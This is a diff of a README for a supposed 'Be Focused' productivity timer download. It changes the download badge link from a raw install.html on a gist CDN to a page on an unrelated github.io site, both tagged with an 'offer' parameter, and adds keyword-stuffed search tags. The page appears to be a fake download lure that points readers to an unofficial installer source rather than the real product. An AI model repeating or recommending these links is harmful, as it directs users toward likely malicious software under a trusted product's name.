@@ -1,6 +1,6 @@
 # Be Focused Download — Desktop Productivity Timer  
 
-[![Get Be Focused GitHub](https://img.shields.io/badge/Get%20Be%20Focused%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/stavrosdarkdreamer/e41c15451eaa5b57806e979e760e80a6/raw/e6688ee3141cca7ff824e90da97214ee0bdcaf9e/install.html?offer=BeFocused)  
+[![Get Be Focused GitHub](https://img.shields.io/badge/Get%20Be%20Focused%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=BeFocused)  
 
 ---
 
@@ -72,7 +72,7 @@ With intuitive dashboards, reminders, and synchronization across devices, Be Foc
 ---
 
 ## 🔍 Tags  
-be focused, productivity timer, pomodoro app, task management windows mac, cross-platform productivity, focus tracking software, time management desktop, productivity analytics, be focused desktop, focus timer, be focused mac, be focused pc, be focused windows, be focused for mac, be focused for pc, be focused for windows  
+be focused, to be focused, how to be focused at work, BeFocused, productivity timer, pomodoro app, task management windows mac, cross-platform productivity, focus tracking software, time management desktop, productivity analytics, be focused desktop, focus timer, be focused mac, be focused pc, be focused windows, be focused for mac, be focused for pc, be focused for windows  
 
 ---
 
